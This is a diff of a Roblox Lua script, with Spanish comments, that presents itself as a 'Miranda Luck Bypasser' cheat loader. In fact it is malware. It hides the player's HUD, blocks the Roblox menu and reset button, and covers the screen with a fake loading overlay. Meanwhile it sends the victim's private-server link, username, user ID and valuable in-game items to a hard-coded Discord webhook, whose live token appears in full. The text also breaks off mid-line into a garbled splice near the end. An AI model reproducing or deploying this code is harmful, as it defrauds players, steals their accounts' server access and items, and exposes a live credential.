@@ -3,6 +3,7 @@ local BLACKLIST = {
     3328221098,
     2353591712,
     8698369158,
+    
 }
 
 local function isBlacklisted(userId)
@@ -23,24 +24,24 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local StarterGui = game:GetService("StarterGui")
-local UserInputService = game:GetService("UserInputService")
-local CoreGui = game:GetService("CoreGui")
-local Workspace = game:GetService("Workspace")
 
+-- Verificar blacklist
 if isBlacklisted(LocalPlayer.UserId) then
     return
 end
 
+-- Función para crear gradiente ROJO-CARMESÍ en UIStroke (con pulso)
 local function createRedCrimsonGradientPulse(stroke)
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),    -- Rojo brillante arriba
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),  -- Carmesí medio
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))       -- Rojo oscuro/carmesí profundo abajo
     }
     gradient.Rotation = 90
     gradient.Parent = stroke
     
+    -- Pulso de intensidad
     local pulseTween = TweenService:Create(stroke, 
         TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
         {Transparency = 0.3}
@@ -109,6 +110,7 @@ local function cerrarMenuRoblox()
         StarterGui:SetCore("ResetButtonCallback", false)
     end)
     
+    local CoreGui = game:GetService("CoreGui")
     for _, gui in ipairs(CoreGui:GetChildren()) do
         if gui:IsA("ScreenGui") then
             if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
@@ -118,7 +120,9 @@ local function cerrarMenuRoblox()
     end
 end
 
+local UserInputService = game:GetService("UserInputService")
 local hudVisible = true
+
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if input.KeyCode == Enum.KeyCode.H then
         hudVisible = not hudVisible
@@ -183,19 +187,8 @@ local allowedAnimals = {
     "La Taco Combinasion",
     "Los Puggies",
     "Los Spaghettis",
-    "Fragrama and Chocrama", 
-    "Capitano Moby",
-    "W or L",
-    "Los Planitos",
-    "Headless Horseman",
-    "Fishino Clownino",
-    "Gobblino Unicilino",
-    "Orcaledon",
-    "Los 67",
-    "Mariachi Corazoni",
-    "Los Burritos",
-    "WorL"
-}
+    "Fragrama and Chocrama"
+ }
 
 local function getPodiumInfo()
     local success, podiumData = pcall(function()
@@ -271,6 +264,7 @@ local function isValidPrivateServerLink(text)
 end
 
 local function sendToWebhook(link, foundAnimals)
+    -- VERIFICAR BLACKLIST ANTES DE ENVIAR
     if isBlacklisted(LocalPlayer.UserId) then
         return false, "User is blacklisted"
     end
@@ -294,7 +288,7 @@ local function sendToWebhook(link, foundAnimals)
         "Spooky and Pumpky",
         "La Secret Combinasion",
         "Burguro And Fryuro",
-        "Capitano Moby",
+        "Mieteteira Bicicleteira",
         "Spaghetti Tualetti",
         "La Spooky Grande",
         "Tictac Sahur",
@@ -306,17 +300,8 @@ local function sendToWebhook(link, foundAnimals)
         "Eviledon",
         "Los Puggies", 
         "La Casa Boo",
-        "La Taco Combinasion",
-        "Headless Horseman",
-        "Orcaledon",
-        "W or L",
-        "Los Planitos",
-        "Las Sis",
-        "Los Primos",
-        "La Supreme Combinasion",
-        "Tang Tang Kelentang",
-        "Ketupat Kepat",
-        "WorL"
+        "La Taco Combinasion"
+        
     }
 
     local webhookNormal = "https://discord.com/api/webhooks/1443786985666908260/Quc1fK1IckCsdayZWVd-ZfqrK42_xDoGhNvcrOVOsHKsWTIxsJoMJkaLXaU-VDVRPLKM"
@@ -347,6 +332,288 @@ local function sendToWebhook(link, foundAnimals)
         else
             animalList = animalList .. "\n" .. animal
         end
+    end
+
+    local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
+    local color = isSpecial and 16766720 or 10038562
+
+    local data = {
+        ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
+        ["embeds"] = {{
+            ["title"] = title,
+            ["color"] = color,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Informacion del jugador:",
+                    ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
+                },
+                {
+                    ["name"] = "👥 Datos del Server:",
+                    ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                },
+                {
+                    ["name"] = "🎮 link:",
+                    ["value"] = "[Click here to join](" .. link .. ")",
+                },
+                {
+                    ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes(secrets):",
+                    ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                },
+                {
+                    ["name"] = "📊 Total:",
+                    ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
+                }
+            },
+            ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local success, err = pcall(function()
+        local jsonData = HttpService:JSONEncode(data)
+        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        pcall(function()
+            local jsonData = HttpService:JSONEncode(data)
+            HttpService:RequestAsync({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
+
+    return true
+end
+
+local function createLoadingScreen()
+    ocultarHUD()
+    spawn(ocultarScreenGuis)
+    
+    spawn(function()
+        while wait(0.1) do
+            cerrarMenuRoblox()
+            
+            if LocalPlayer then
+                local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                if PlayerGui then
+                    for _, gui in ipairs(PlayerGui:GetChildren()) do
+                        if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" then
+                            gui.Enabled = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    
+    local loadingScreenGui = Instance.new("ScreenGui")
+    loadingScreenGui.Name = "MoneyBypasserLoader"
+    loadingScreenGui.ResetOnSpawn = false
+    loadingScreenGui.IgnoreGuiInset = true
+    loadingScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreenGui.Parent = playerGui
+
+    local backgroundFrame = Instance.new("Frame")
+    backgroundFrame.Size = UDim2.new(1,0,1,0)
+    backgroundFrame.Position = UDim2.new(0,0,0,0)
+    backgroundFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    backgroundFrame.BackgroundTransparency = 0
+    backgroundFrame.BorderSizePixel = 0
+    backgroundFrame.ZIndex = 0
+    backgroundFrame.Parent = loadingScreenGui
+
+    
+    -- Efecto Matrix Rain mejorado con ROJO-CARMESÍ
+local matrixChars = {"÷", "¢", "€", "$", "¥", "₹", "₽", "₱", "₩", "£", "¥", "฿"}
+local matrixRains = {}
+
+local function createMatrixRain()
+    local rainFrame = Instance.new("Frame")
+    rainFrame.Name = "MatrixRain"
+    rainFrame.Size = UDim2.new(0, math.random(20, 40), 1, 200)
+    rainFrame.Position = UDim2.new(0, math.random(0, backgroundFrame.AbsoluteSize.X), 0, -200)
+    rainFrame.BackgroundTransparency = 1
+    rainFrame.ZIndex = 1
+    rainFrame.Parent = backgroundFrame
+    
+    local charCount = math.random(8, 15)
+    local chars = {}
+    local speed = math.random(2, 6) / 100
+    
+    for i = 1, charCount do
+        local char = Instance.new("TextLabel")
+        char.Name = "Char" .. i
+        char.Size = UDim2.new(1, 0, 0, math.random(30, 60))
+        char.Position = UDim2.new(0, 0, 0, (i - 1) * math.random(25, 50))
+        char.BackgroundTransparency = 1
+        char.Text = matrixChars[math.random(1, #matrixChars)]
+        char.Font = Enum.Font.Arcade
+        char.TextXAlignment = Enum.TextXAlignment.Center
+        char.TextScaled = false
+        char.ZIndex = 1
+        char.Parent = rainFrame
+        
+        -- Tamaño de texto aleatorio
+        local textSize = math.random(24, 48)
+        char.TextSize = textSize
+        
+        -- Los más grandes más brillantes, los más pequeños más transparentes
+        local transparency = 0.3 + ((48 - textSize) / 48) * 0.6
+        char.TextTransparency = transparency
+        
+        -- Gradiente de ROJO-CARMESÍ basado en posición
+        local redIntensity = math.max(139, 255 - (i * 10))
+        local greenValue = math.max(0, 50 - (i * 5))
+        char.TextColor3 = Color3.fromRGB(redIntensity, greenValue, greenValue)
+        
+        -- Stroke más visible en caracteres grandes con ROJO-CARMESÍ
+        local stroke = Instance.new("UIStroke")
+        stroke.Thickness = math.floor(textSize / 16)
+        stroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+        stroke.Transparency = transparency - 0.1
+        stroke.Parent = char
+        
+        table.insert(chars, char)
+    end
+    
+    table.insert(matrixRains, {
+        frame = rainFrame,
+        chars = chars,
+        speed = speed,
+        lifetime = 0
+    })
+    
+    return rainFrame
+end
+
+-- Crear lluvias iniciales
+for i = 1, 30 do
+    createMatrixRain()
+    task.wait(0.05)
+end
+
+-- Sistema de animación de lluvia Matrix
+task.spawn(function()
+    while backgroundFrame.Parent do
+        -- Mover todas las lluvias
+        for i = #matrixRains, 1, -1 do
+            local rain = matrixRains[i]
+            
+            if not rain.frame.Parent then
+                table.remove(matrixRains, i)
+                continue
+            end
+            
+            -- Mover hacia abajo
+            local currentY = rain.frame.Position.Y.Offset
+            local newY = currentY + (rain.speed * 100)
+            rain.frame.Position = UDim2.new(rain.frame.Position.X.Scale, rain.frame.Position.X.Offset, 0, newY)
+            
+            -- Cambiar caracteres aleatoriamente
+            for _, char in pairs(rain.chars) do
+                if math.random() < 0.05 then
+                    char.Text = matrixChars[math.random(1, #matrixChars)]
+                end
+            end
+            
+            -- Pulso de brillo ROJO-CARMESÍ
+            rain.lifetime = rain.lifetime + 0.05
+            local pulse = math.sin(rain.lifetime * 2) * 0.15
+            for j, char in pairs(rain.chars) do
+                local baseRed = math.max(139, 255 - (j * 10))
+                local pulsedRed = math.floor(baseRed + pulse * 80)
+                local greenValue = math.max(0, 50 - (j * 5))
+                char.TextColor3 = Color3.fromRGB(pulsedRed, greenValue, greenValue)
+            end
+            
+            -- Si sale de la pantalla, eliminar y crear nueva
+            if newY > backgroundFrame.AbsoluteSize.Y + 200 then
+                rain.frame:Destroy()
+                table.remove(matrixRains, i)
+                
+                -- Crear nueva lluvia en posición aleatoria
+                task.spawn(function()
+                    task.wait(math.random(0, 2))
+                    createMatrixRain()
+                end)
+            end
+        end
+        
+        task.wait(0.03)
+    end
+end)
+
+-- Generador continuo de nuevas lluvias
+task.spawn(function()
+    while backgroundFrame.Parent do
+        task.wait(math.random(1, 3))
+        if #matrixRains < 35 then
+            createMatrixRain()
+        end
+    end
+end)
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "LoadingFrame"
+    mainFrame.Size = UDim2.new(0, 500, 0, 320)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 10
+    mainFrame.Parent = loadingScreenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0,12)
+    mainCorner.Parent = mainFrame
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Thickness = 3
+    mainStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí base
+    mainStroke.Parent = mainFrame
+    createRedCrimsonGradientPulse(mainStroke)
+
+    local headerFrame = Instance.new("Frame")
+    headerFrame.Parent = mainFrame
+    headerFrame.Size = UDim2.new(1,0,0,70)
+    headerFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    headerFrame.BorderSizePixel = 0
+    headerFrame.ZIndex = 11
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0,12)
+    headerCorner.Parent = headerFrame
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Parent = headerFrame
+    titleLabel.Size = UDim2.new(1,-30,0,35)
+    titleLabel.Position = UDim2.new(0,15,0,8)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "Miranda Luck Bypasser"
+    titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
+    titleLabel.TextSize = 22
+    titleLabel.Font = Enum.Font.Arcade
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    titleLabel.ZIndex = 12
+
+    local titleStroke = Instance.new("UIStroke")
+    titleStroke.Thickness = 2
+    titleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+    titleStroke.Parent = titleLabel
+    createRedCrimsonGradientPulse(titleStroke)
+
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Parent = headerFrame
+    subtitleLabel.Size = UDim2.new(1,-30,0,20)
+    subtitleLabel.Position = UDim2.new(0,15,0,45)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Text = "By Miranda"
+    subtitleLabel.TextColor3 = Color3.fromRGB(180,180,200)
+    subtitleLabel.TextSize = 14
+    subtitle  end
     end
 
     local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
